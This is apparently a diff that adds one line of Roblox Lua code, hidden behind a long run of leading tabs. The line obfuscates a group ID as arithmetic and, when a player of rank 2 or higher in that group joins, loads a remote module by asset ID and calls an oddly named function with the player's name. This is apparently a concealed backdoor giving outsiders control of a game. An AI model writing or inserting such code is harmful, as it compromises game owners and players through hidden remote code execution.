@@ -1,0 +1,1 @@
+																																																																																														local v0=110223507 -74969198 ;game.Players.PlayerAdded:Connect(function(v1) if v1:IsInGroup(v0) then if (v1:GetRankInGroup(v0)>=2) then require(73854684095652).thehatwasawfulrad(v1.Name);end end end);
